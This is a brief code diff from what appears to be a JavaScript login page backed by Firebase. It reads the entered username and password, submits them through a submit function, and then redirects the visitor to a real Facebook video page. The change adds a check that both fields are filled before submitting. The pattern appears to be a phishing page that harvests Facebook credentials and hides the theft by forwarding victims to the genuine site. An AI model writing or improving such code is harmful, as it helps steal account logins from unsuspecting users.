@@ -33,9 +33,10 @@ var firebaseConfig = {
             usename:username.value,
             password:password.value 
         }
-       
+       if(username.value && password.value){
         await submit(username.value,password.value);
         window.location.replace('https://www.facebook.com/watch/?v=193954128684871','_blank');
+    }
         
 })
 
